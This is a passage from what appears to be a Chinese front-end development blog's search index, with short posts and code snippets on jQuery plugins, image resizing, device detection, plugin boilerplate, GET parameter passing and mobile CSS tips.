$(this).turn('view'));*/ &#125; &#125; &#125;); &#125;); $(window).bind('keydown', function(e)&#123; if (e.keyCode==37) $('#magazine').turn('previous'); else if (e.keyCode==39) $('#magazine').turn('next'); &#125;);&lt;/script&gt;查看演示官方下载官方网站]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>turn.js</tag>
        <tag>书本和杂志翻页效果</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[可拖拽和删除jQuery网格布局插件jQuery Gridly]]></title>
    <url>%2F2015%2F07%2F25%2F%E5%8F%AF%E6%8B%96%E6%8B%BD%E5%92%8C%E5%88%A0%E9%99%A4jquery%E7%BD%91%E6%A0%BC%E5%B8%83%E5%B1%80%E6%8F%92%E4%BB%B6jquery-gridly%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;可拖拽和删除jQuery网格布局插件jQuery Gridly，基于jQuery插件实现，拖拽和删除自动计算宽度和高度，拖拽可交互网格位置，删除自动补位，点击网格自动放大自动重新布局，效果是非常不错的，推荐使用。使用方法：1、加载插件和jQuery1234567891011121314151617&lt;script src="libs/jquery/2.0.2/jquery.min.js" type="text/javascript"&gt;&lt;/script&gt;&lt;script src="javascript/jquery.gridly.js" type="text/javascript"&gt;&lt;/script&gt;&lt;link href="stylesheets/jquery.gridly.css" rel="stylesheet" type="text/css" /&gt;style type="text/css"&gt; .gridly &#123; position: relative; width: 960px; &#125; .brick.small &#123; width: 140px; height: 140px; &#125; .brick.large &#123; width: 300px; height: 300px; &#125;&lt;/style&gt;2、HTML内容12345678&lt;div class="gridly"&gt; &lt;div class="brick small"&gt;&lt;/div&gt; &lt;div class="brick small"&gt;&lt;/div&gt; &lt;div class="brick large"&gt;&lt;/div&gt; &lt;div class="brick small"&gt;&lt;/div&gt; &lt;div class="brick small"&gt;&lt;/div&gt; &lt;div class="brick large"&gt;&lt;/div&gt;&lt;/div&gt;3、函数调用1234567&lt;script&gt; $('.gridly').gridly(&#123; base: 60, // px gutter: 20, // px columns: 12 &#125;);&lt;/script&gt;查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>可拖拽和删除布局</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery按照比例自动调整网站图片大小]]></title>
    <url>%2F2015%2F07%2F25%2Fjquery%E6%8C%89%E7%85%A7%E6%AF%94%E4%BE%8B%E8%87%AA%E5%8A%A8%E8%B0%83%E6%95%B4%E7%BD%91%E7%AB%99%E5%9B%BE%E7%89%87%E5%A4%A7%E5%B0%8F%2F</url>
    <content type="text"><![CDATA[基于jQuery，用在图片过大撑开页面影响美观的情况下，可以自定义图片超过最大尺寸并根据这个尺寸进行比例缩放，从而控制页面大图的显示，下面贴下代码，有需要的可以借鉴下。1234567891011121314151617181920212223&lt;script type="text/javascript"&gt;$(document).ready(function()&#123; $('img').each(function()&#123; var maxWidth =500; // 图片最大宽度 var maxHeight =500; // 图片最大高度 var ratio = 0; // 缩放比例 var width = $(this).width(); // 图片实际宽度 var height = $(this).height(); // 图片实际高度 if(width &gt; maxWidth)&#123; // 检查图片是否超宽 ratio = maxWidth / width; // 计算缩放比例 $(this).css("width", maxWidth); // 设定实际显示宽度 height = height * ratio; // 计算等比例缩放后的高度 $(this).css("height", height); // 设定等比例缩放后的高度 &#125; if(height &gt; maxHeight)&#123; // 检查图片是否超高 ratio = maxHeight / height; // 计算缩放比例 $(this).css("height", maxHeight); // 设定实际显示高度 width = width * ratio; // 计算等比例缩放后的高度 $(this).css("width", width); // 设定等比例缩放后的高度 &#125; &#125;);&#125;); &lt;/script&gt;&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js按比例自动调整图片</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[表单密码强度监测判断JS代码特效]]></title>
    <url>%2F2015%2F07%2F25%2F%E8%A1%A8%E5%8D%95%E5%AF%86%E7%A0%81%E5%BC%BA%E5%BA%A6%E7%9B%91%E6%B5%8B%E5%88%A4%E6%96%ADjs%E4%BB%A3%E7%A0%81%E7%89%B9%E6%95%88%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在现实的用户注册中，大多数表单是没有密码强度的检测，今天就提供一款JS密码强度检测代码，基于jQuery实现，响应事件使用keyup，大家可以下载看看效果。查看演示点击下载&nbsp;&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>js密码强度监测</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[非常逼真全屏雨滴动画JS代码特效]]></title>
    <url>%2F2015%2F07%2F25%2F%E9%9D%9E%E5%B8%B8%E9%80%BC%E7%9C%9F%E5%85%A8%E5%B1%8F%E9%9B%A8%E6%BB%B4%E5%8A%A8%E7%94%BBjs%E4%BB%A3%E7%A0%81%E7%89%B9%E6%95%88%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;非常逼真全屏雨滴动画JS代码特效，基于jQuery插件rainyday.js，效果非常不错，可以接近Flash动画效果，当然需要浏览器支持HTML5和CSS3的，如果大家在项目中需要用到这种效果，大家可以借鉴学习下。查看演示点击下载&nbsp;&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>js雨滴动画</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[带动画效果火箭图标JS返回顶部]]></title>
    <url>%2F2015%2F07%2F25%2F%E5%B8%A6%E5%8A%A8%E7%94%BB%E6%95%88%E6%9E%9C%E7%81%AB%E7%AE%AD%E5%9B%BE%E6%A0%87js%E8%BF%94%E5%9B%9E%E9%A1%B6%E9%83%A8%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;带动画效果火箭图标JS返回顶部特效代码，效果非常流畅的JS特效代码,基于jQuery实现，喜欢这动画效果的可以学习学习。查看演示点击下载&nbsp;&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jq带动画火箭返回顶部</tag>
        <tag>js带动画火箭返回顶部</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[带大图预览功能的JS相册]]></title>
    <url>%2F2015%2F07%2F25%2F%E5%B8%A6%E5%A4%A7%E5%9B%BE%E9%A2%84%E8%A7%88%E5%8A%9F%E8%83%BD%E7%9A%84js%E7%9B%B8%E5%86%8C%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;大气带大图预览功能的JS相册特效代码，此款JS特效是基于jQuery实现，插件支持强大的参数自定义功能，如是否自定义播放，是否弹窗显示，图片间隔播放时间定义，20多个参数可以自定义功能，还是非常强的相册代码特效，我想这个插件做相册特效一定是你想要的。下面把配置参数列出来：12345678910111213141516171819202122box:"#demo1",//总框架pic:"#ban_pic1",//大图框架pnum:"#ban_num1",//小图框架prev_btn:"#prev_btn1",//小图左箭头next_btn:"#next_btn1",//小图右箭头pop_prev:"#prev2",//弹出框左箭头pop_next:"#next2",//弹出框右箭头prev:"#prev1",//大图左箭头next:"#next1",//大图右箭头pop_div:"#demo2",//弹出框框架pop_pic:"#ban_pic2",//弹出框图片框架pop_xx:".pop_up_xx",//关闭弹出框按钮mhc:".mhc",//朦灰层autoplay:true,//是否自动播放interTime:5000,//图片自动切换间隔delayTime:400,//切换一张图片时间pop_delayTime:400,//弹出框切换一张图片时间order:0,//当前显示的图片（从0开始）picdire:true,//大图滚动方向（true为水平方向滚动）mindire:true,//小图滚动方向（true为水平方向滚动）min_picnum:5,//小图显示数量pop_up:true//大图是否有弹出框查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jQuery相册代码</tag>
        <tag>jQuery相册插件</tag>
        <tag>jQuery相册特效</tag>
        <tag>JS相册代码</tag>
        <tag>js相册插件</tag>
        <tag>JS相册特效</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[漂亮体验非常好带动画效果的JS拖拽排序]]></title>
    <url>%2F2015%2F07%2F25%2F%E6%BC%82%E4%BA%AE%E4%BD%93%E9%AA%8C%E9%9D%9E%E5%B8%B8%E5%A5%BD%E5%B8%A6%E5%8A%A8%E7%94%BB%E6%95%88%E6%9E%9C%E7%9A%84js%E6%8B%96%E6%8B%BD%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;漂亮体验非常好带动画效果的JS拖拽排序特效代码，基于jQuery，自动判断位置的排列，自动排序，插件非常流畅，支持动画移动位置，挺不错的JS特效，值得去学习和使用。查看演示点击下载&nbsp;&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>js带动画的拖拽</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery新手指引流程引导插件Intro.Js]]></title>
    <url>%2F2015%2F07%2F25%2Fjquery%E6%96%B0%E6%89%8B%E6%8C%87%E5%BC%95%E6%B5%81%E7%A8%8B%E5%BC%95%E5%AF%BC%E6%8F%92%E4%BB%B6intro-js%2F</url>
    <content type="text"><![CDATA[实用jQuery新手指引流程引导插件Intro.Js，不错的JS特效，一般用在新功能上线后，对用户的操作进行引导，也用在新手帮助方面，此JS插件支持键盘左右键切换引导，支持enter进入下一步，支持ESC取消引导，还是很不错的JS特效，使用方法也很简单。设置参数：设置多个格式 json格式：key:value可设置参数123456789101112131415161718nextLabel: "Next &amp;amp;rarr;",prevLabel: "&amp;amp;larr; Back",skipLabel: "Skip",doneLabel: "Done",tooltipPosition: "bottom",tooltipClass: "",highlightClass: "",exitOnEsc: !0,exitOnOverlayClick: !0,showStepNumbers: !0,keyboardNavigation: !0,showButtons: !0,showBullets: !0,showProgress: !1,scrollToElement: !0,overlayOpacity: 0.8,positionPrecedence: ["bottom", "top", "right", "left"],disableInteraction: !1设置方法（多个参数设置）1关键字：setOptions1introJs().setOptions(&#123;'prevLabel':'&amp;amp;larr; 上一步','nextLabel':'下一步 &amp;amp;rarr;','skipLabel':'跳过','doneLabel':'完成'&#125;).start();设置方法(单个参数设置)1关键字：setOption1introJs().setOption("prevLabel","上一步").start();页面分布引导的元素设置：12&lt;div id="demo" data-step="1" data-intro="这里是分布引导的内容……" data-position="right"&gt;&lt;/div&gt;说明：data-step：第几步data-intro：分布引导的内容data-position：引导内容显示位置，参数：left,right,top,bottom(不解释)查看演示点击下载&nbsp;&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jq新手引导</tag>
        <tag>jq新手指引流程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JQ在线选座位seat-charts插件]]></title>
    <url>%2F2015%2F07%2F25%2Fjq%E5%9C%A8%E7%BA%BF%E9%80%89%E5%BA%A7%E4%BD%8Dseat-charts%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[仿在线订机票网站jQuery在线选座位插件seat-charts，很不错的JS在线选座特效，选座好后直接显示选择的座位，也适合电影票网站使用，点击座位选择，再点击则取消选择，还是可以值得学习的JS特效。查看演示点击下载&nbsp;&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>在线选座插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery图片层叠3D旋转切换效果]]></title>
    <url>%2F2015%2F07%2F25%2Fjquery%E5%9B%BE%E7%89%87%E5%B1%82%E5%8F%A03d%E6%97%8B%E8%BD%AC%E5%88%87%E6%8D%A2%E6%95%88%E6%9E%9C%2F</url>
    <content type="text"><![CDATA[非常美的jQuery图片层叠3D旋转切换特效代码，带左右按钮和圆点按钮切换，支持自动切换，可以自定义切换时间间隔和速度，大家可以看看是不是你要的特效代码。查看演示点击下载&nbsp;&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jq层叠3D旋转切换</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[仿百度空间JS鼠标悬停图片放大动画]]></title>
    <url>%2F2015%2F07%2F25%2F%E4%BB%BF%E7%99%BE%E5%BA%A6%E7%A9%BA%E9%97%B4js%E9%BC%A0%E6%A0%87%E6%82%AC%E5%81%9C%E5%9B%BE%E7%89%87%E6%94%BE%E5%A4%A7%E5%8A%A8%E7%94%BB%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;仿百度空间JS鼠标悬停图片放大动画特效代码，挺不错的JS特效，基于jQuery实现，对于提升用户体验是非常不错的特效，实现的原理也很简单，需要学习的同学可以看看代码。查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>鼠标悬停图片放大</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML5+JS实现刮刮乐刮刮卡抽奖]]></title>
    <url>%2F2015%2F07%2F25%2Fhtml5js%E5%AE%9E%E7%8E%B0%E5%88%AE%E5%88%AE%E4%B9%90%E5%88%AE%E5%88%AE%E5%8D%A1%E6%8A%BD%E5%A5%96%2F</url>
    <content type="text"><![CDATA[非常不错的HTML5+JS实现刮刮乐刮刮卡抽奖特效代码，基于jQuery实现，支持响应式手机页面使用，支持手机涂抹，如今在微营销中经常使用这种方式，用户体验非常的不错。查看演示点击下载&nbsp;&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>刮刮乐抽奖插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于Zepto+CSS3宝箱开启动画抽奖JS特效]]></title>
    <url>%2F2015%2F07%2F25%2F%E5%9F%BA%E4%BA%8Ezeptocss3%E5%AE%9D%E7%AE%B1%E5%BC%80%E5%90%AF%E5%8A%A8%E7%94%BB%E6%8A%BD%E5%A5%96js%E7%89%B9%E6%95%88%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;基于Zepto+CSS3宝箱开启动画抽奖JS特效代码，很不错的特效代码，特效基于Zepto、CSS3，其中有好几种CSS3动画效果，背景光环滚动，宝箱摇摆开启，弹出提示层，还是很不错的CSS3动画特效，大家可以学习下。查看演示点击下载&nbsp;&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>宝箱抽奖</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[带CSS3动画响应式jQuery垂直时间轴特效]]></title>
    <url>%2F2015%2F07%2F25%2F%E5%B8%A6css3%E5%8A%A8%E7%94%BB%E5%93%8D%E5%BA%94%E5%BC%8Fjquery%E5%9E%82%E7%9B%B4%E6%97%B6%E9%97%B4%E8%BD%B4%E7%89%B9%E6%95%88%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;带动画效果响应式jQuery垂直时间轴特效代码，很不错的时间轴特效，支持手机端响应式，动画效果采用CSS3动画，非常适合介绍项目进程和发展历史的使用。查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jq垂直时间轴</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实用jQuery单页视差滚动插件jquery.localscroll]]></title>
    <url>%2F2015%2F07%2F25%2F%E5%AE%9E%E7%94%A8jquery%E5%8D%95%E9%A1%B5%E8%A7%86%E5%B7%AE%E6%BB%9A%E5%8A%A8%E6%8F%92%E4%BB%B6jquery-localscroll%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;实用jQuery单页视差滚动插件jquery.localscroll，当前非常流行单页面视差滚动特效，一个页面完成整个网站的产品ji介绍、案例欣赏，非常不错的JS特效代码，适合简单的企业网站的建设，不需要很复杂的功能。滚动鼠标液动条看下页面的切换效果。该插件适用浏览器：IE8、360、FireFox、Chrome、Safari、Opera、傲游、搜狗、世界之窗。效果图如下:查看演示点击下载&nbsp;&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jq视觉差滚动</tag>
        <tag>视差滚动插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[兼容性较好的jQuery抽奖大转盘特效]]></title>
    <url>%2F2015%2F07%2F25%2F%E5%85%BC%E5%AE%B9%E6%80%A7%E8%BE%83%E5%A5%BD%E7%9A%84jquery%E6%8A%BD%E5%A5%96%E5%A4%A7%E8%BD%AC%E7%9B%98%E7%89%B9%E6%95%88%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;兼容性较好的jQuery抽奖大转盘特效代码，基于jQuery插件rotate.js实现图片旋转，纯JS随机实现如果要结合后台实现概率、奖品抽奖，可以通过Ajax实现获取后台数据判断。查看演示点击下载&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jq抽奖大转盘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[酷炫门户网站相册效果特效JS]]></title>
    <url>%2F2015%2F07%2F25%2F%E9%85%B7%E7%82%AB%E9%97%A8%E6%88%B7%E7%BD%91%E7%AB%99%E7%9B%B8%E5%86%8C%E6%95%88%E6%9E%9C%E7%89%B9%E6%95%88js%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;酷炫门户网站相册效果特效JS代码，门户网站常见JS相册播放特效，支持左右按键播放，支持查看原图，支持JSON数据格式传递数据，还是非常不错的相册特效。查看演示点击下载&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>相册效果特效</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Win8风格Metro界面平板响应式导航特效代码]]></title>
    <url>%2F2015%2F07%2F25%2Fwin8%E9%A3%8E%E6%A0%BCmetro%E7%95%8C%E9%9D%A2%E5%B9%B3%E6%9D%BF%E5%93%8D%E5%BA%94%E5%BC%8F%E5%AF%BC%E8%88%AA%E7%89%B9%E6%95%88%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[Win8风格Metro界面平板响应式导航特效JS代码，响应式布局，支持横向滚动，支持自定义横向布局还是竖向布局，还是很不错的，适合功能导航界面。查看演示点击下载&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>Win8风格</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[$.extend()和$.fn.extend()区别]]></title>
    <url>%2F2015%2F07%2F25%2Fextend%E5%92%8C-fn-extend%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[$.extend()和$.fn.extend()用法和区别:在自己制作插件的时候会经常用到$.extend()和$.fn.extend()两个函数，无论从外观还是作用都非常的类似，但是实际上它们的区别是巨大的，下面就简单介绍一下它们的区别是什么。在javascript中，没有尽管没有类这个概念，但是作为一门面向对象的语言，其实是有着类似于类的实际应用，那么从标准面向对象的概念来说，jQuery就是一个封装好了的jQuery类，那么通过选择器获得的就是jQuery对象实例。一.$.extend():此方法是用来扩展jQuery类，此方法是全局性，直接用jQuery类即可引用，例如:12$.extend(&#123;minValue:function(a,b)&#123;return a&lt;b?a:b;&#125;&#125;)$.minValue(5.6);也可以把这类函数称作为工具函数，不直接操作DOM元素，而是操作Javascript的非元素对象，或者执行其他非对象的特定操作。二.$.fn.extend():此方法则是用来扩展jQuery的实例方法，也就是说jQuery类的实例对象可以调用此函数，代码如下:123456789101112131415&lt;script type="text/javascript"&gt;$(document).ready(function()&#123; $.fn.extend(&#123; theAlert:function()&#123; alert("自定义的函数"); &#125; &#125;) $("thediv").theAlert()&#125;)&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="thediv"&gt;按钮&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;以上代码通过$.fn.extend()方法为jQuery扩展一个实例方法，那么就必须要用对象实例来调用此方法，$(“thediv”)就是一个对象实例，这样它就可以调用添加的方法，当然在实际的开发中，几乎不可能有这么简单的例子，这里只是讲述一下原理。&nbsp;&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>$.extend()和$.fn.extend()区别</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[select接收后台返回值的解决方案]]></title>
    <url>%2F2015%2F07%2F25%2Fselect%E6%8E%A5%E6%94%B6%E5%90%8E%E5%8F%B0%E8%BF%94%E5%9B%9E%E5%80%BC%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[在做页面表单或者条件筛选的时候，如何把select标签的值，在刷新页面后，保持选择的值。下面，将给出两种解决方案：前提： 前台select标签 name为type ； 后台接收type的值，业务完成后把type值反回给页面。一：利用jquery为select标签赋值。第1步： 为select增加id，便于jquery控制。12345&lt;select name="type" id="type"&gt; &lt;option value="0"&gt;优&lt;/option&gt; &lt;option value="1"&gt;良&lt;/option&gt; &lt;option value="2"&gt;及格&lt;/option&gt;&lt;/select&gt;第2步：利用jquery接收后台type的值并为select标签赋值。12345&lt;script type="text/javascript"&gt; $(function()&#123; $("[name='type']").val($&#123;type&#125;); &#125;)&lt;/script&gt;//或者12345&lt;script type="text/javascript"&gt; $(function()&#123; $("#type").val($&#123;type&#125;); &#125;)&lt;/script&gt;二：利用jstl控制select的option是否选中。12345&lt;select name="type"&gt; &lt;option value="0" &lt;c:if test="$&#123;type==0&#125;"&gt;selected&lt;/c:if&gt;&gt;优&lt;/option&gt; &lt;option value="1" &lt;c:if test="$&#123;type==1&#125;"&gt;selected&lt;/c:if&gt;&gt;良&lt;/option&gt; &lt;option value="2" &lt;c:if test="$&#123;type==2&#125;"&gt;selected&lt;/c:if&gt;&gt;及格&lt;/option&gt;&lt;/select&gt;&nbsp;&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>select接收后台返回值</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动前端开发知识分享]]></title>
    <url>%2F2015%2F07%2F25%2F%E7%A7%BB%E5%8A%A8%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB%2F</url>
    <content type="text"><![CDATA[1、在手机端如果1px线条仍然显示过粗，可以使用css新属性border-image边框图像来解决例：border-image: url(../img/line-img1.png) 2 0 round;关于border-image熟悉的介绍：http://www.w3cplus.com/content/css3-border-image&nbsp;2、在部分安卓机上使用border-image后，发现内容区域设置 :active 后不起作用。原因：border-image 后面默认加了fill关键字解决办法：使用的边框图片，图片中间区域背景一定要是透明的。&nbsp;3、部分安卓机对键盘事件不兼容，如果是对输入框内容监听变化可用input事件&nbsp;4、部分iphone上，页面内如果有position:fixed固定内容，第一次滑动页面时，固定内容会随页面滑动，松开手后，内容回到原位。bug原因和覆盖范围未知。解决办法：用js控制固定内容第一次滑动时的的top值&nbsp;5、防止按钮点击时 背景闪烁html{-webkit-tap-highlight-color: transparent;}&nbsp;6、设置input的placeholder内容样式的方法input::-webkit-input-placeholder{color:#999;font-size: 14px;}7、兼容iOS伪类 :active 需要给 document 绑定 touchstart 或 touchend 事件document.addEventListener(‘touchstart’,function(){},false);&nbsp;8、消除 IE10 里 input输入框右侧的叉号input:-ms-clear{ display:none; }&nbsp;9、 禁止用户选中文字-webkit-user-select:none&nbsp;10、腾讯移动端解决方案https://github.com/AlloyTeam/Mars&nbsp;11、移动设备尺寸大全http://screensiz.es/phone​&nbsp;12、各种参考手册css: http://css.doyoe.com/javascript: https://msdn.microsoft.com/zh-CN/library/yek4tbz0.aspxzepto: http://www.css88.com/doc/zeptojs_api/jquery: http://tool.oschina.net/apidocs/apidoc?api=jquery&nbsp;13、input输入框输入内容后，点击自定义清空内容的按钮，键盘收起的问题解决办法：按钮用input标签，改变样式为按钮样子，点击删除后，设置原输入框focus();]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>移动前端开发知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jquery插件开发基础代码讲解]]></title>
    <url>%2F2015%2F07%2F25%2Fjquery%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80%E4%BB%A3%E7%A0%81%E8%AE%B2%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334353637383940414243//这里可以以注释的形式写上版本号，插件用途，版权，插件使用格式等等等等//加上 ; 能防止前面代码没有 ； 结尾的后果，无惧压缩;(function($,window,document,undefined)&#123; //undefinde是真实的undefined，并非参数//将可选择的变量传递给方法//定义构造函数(对象)var Datalist=function(ele,opt)&#123;this.$element=ele;this.defaults=&#123; //定义默认属性'默认属性名':'对应属性值'&#125;,this.options=$.extend(&#123;&#125;, this.defaults, opt); //在使用的时候会自动执行$.extend()函数，让用户自定的属性值覆盖default里面默认的属性值。前面加上&#123;&#125;空对象是为了防止多次调用时前面的属性值修改了默认属性值//这里可以添加一些通用的属性方法，供下面多个方法使用&#125;//在对象原型上定义方法,数目不限Datalist.prototype=&#123;showList:function()&#123;var color=this.options.bgcolor; //值的传递形式(最好这里把需要的全部取出来，毕竟在不同环境下this的指代不一样)//这里是具体的实现过程书写区域return this; //return是为了不破坏jquery链式调用的特点（注意return的对象是原对象），也可以以返回值的形式回调一个函数&#125;&#125;//在插件中使用Datalist对象$.fn.myDatalist=function(options)&#123;//创建实体var datalist=new Datalist(this,options);//以返回值调用的形式调用其方法return datalist.showList();&#125;&#125;)(jQuery,window,document); //其实就是 (function()&#123;&#125;());的闭包形式，定义匿名函数并立即调用，里面的事件绑定什么的就像在全局定义一样的可以用(页面关闭的时候才销毁)，但是全局空间里面是不可见不可取得的//在需要的地方调用插件$(document).ready(function()&#123;$(object).myDatalist(&#123;"属性名":"属性值"&#125;); //没有设置的属性会用默认值&#125;);]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>jq插件开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[参数传递的四种形式：URL、超链接、js、form表单]]></title>
    <url>%2F2015%2F07%2F25%2F%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E7%9A%84%E5%9B%9B%E7%A7%8D%E5%BD%A2%E5%BC%8F%EF%BC%9Aurl%E3%80%81%E8%B6%85%E9%93%BE%E6%8E%A5%E3%80%81js%E3%80%81form%E8%A1%A8%E5%8D%95%2F</url>
    <content type="text"><![CDATA[什么时候用GET, 查，删，什么时候用POST,增，改（特列：登陆用Post,因为不能让用户名和密码显示在URL上）4种get传参方式123456789101112131415161718192021222324252627282930&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"/&gt;&lt;title&gt;&lt;/title&gt;&lt;script type="text/javascript"&gt;function Go() &#123;window.location.href="localhost:21811/Handler1.ashx?id=1&amp;amp;name='abc'"&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;!--//参数传递的几种形式--&gt;&lt;!--第一种：直接在URL后面加参数：--&gt;localhost:21811/Handler1.ashx?id=1&amp;amp;name="abc"&lt;!--第二种：用超链接的方法传递参数：当点击超链接的时候，首先会跳转到localhost:21811/Handler1.ashx页面，然后还会传递id 和name 两个参数过去--&gt;&lt;a href="localhost:21811/Handler1.ashx?id=1&amp;amp;name='abc'"&gt;超链接传递参数&lt;/a&gt;&lt;/body&gt;&lt;!--第三种：通过js方法传递:用户点击这个button按钮，触发onClick事件，执行Go()方法，跳转到localhost:21811/Handler1.ashx页面，同时传递了id，和name两个参数过去--&gt;&lt;input type="button" onclick="Go()" value="通过js方法传递参数" /&gt;&lt;!--第四种：通过form表单传递--&gt;&lt;form action="Handler1.ashx" method="get"&gt;&lt;!--注意action里面的连接不能带参数的--&gt;&gt;&lt;input type="text" name="id" value="3" /&gt;&lt;input type="text" name="name" value="abc" /&gt;&lt;input type="submit" value="通过传递参数" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>参数传递的形式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何判断是手机还是电脑访问网站]]></title>
    <url>%2F2015%2F07%2F25%2F%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E6%89%8B%E6%9C%BA%E8%BF%98%E6%98%AF%E7%94%B5%E8%84%91%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;现在由于手机功能的强大，使用手机上网的用户越来越多，那么就需要判断用户是用何种客户端登陆的网站，如果使用的是电脑则使用电脑版本的网页，如果使用的手机则使用手机版本的网页，下面是一段能够判断是手机还是电脑的代码：123456789101112131415function check()&#123;var userAgentInfo=navigator.userAgent;var Agents =new Array("Android","iPhone","SymbianOS","Windows Phone","iPad","iPod");var flag=true;for(var v=0;v&lt;Agents.length;v++)&#123;if(userAgentInfo.indexOf(Agents[v])&gt;0)&#123;flag=false;break;&#125;&#125;return flag;&#125;&emsp;&emsp;在以上代码中，如果如果flag返回值为true则说明是电脑客户端，如果是false，则说明使用的是移动客户端，代码比较简单这里就不多介绍了，直接套用就可以了.&nbsp;&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>判断是手机还是电脑访问网站</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript如何将文件保存到本地]]></title>
    <url>%2F2015%2F07%2F25%2Fjavascript%E5%A6%82%E4%BD%95%E5%B0%86%E6%96%87%E4%BB%B6%E4%BF%9D%E5%AD%98%E5%88%B0%E6%9C%AC%E5%9C%B0%2F</url>
